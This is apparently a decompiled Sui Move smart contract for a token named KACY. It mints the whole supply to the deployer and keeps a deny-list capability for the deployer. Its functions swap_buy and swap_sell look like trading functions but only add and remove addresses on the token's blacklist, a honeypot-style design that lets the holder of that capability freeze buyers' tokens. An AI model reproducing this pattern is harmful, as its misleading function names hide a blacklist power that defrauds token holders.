module 0x440602af11450aa9af00cb6b719fe1b65733254930d49d8e6892e3cb2a3e0219::kacy {
    struct KACY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: KACY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<KACY>(arg0, 9, b"KACY", b"markkacy", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXVUag77A8zmMLhvQRxdhhfhm7SmmkvLFb3SmvkGSiBZD"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<KACY>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<KACY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<KACY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<KACY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KACY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<KACY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KACY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<KACY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

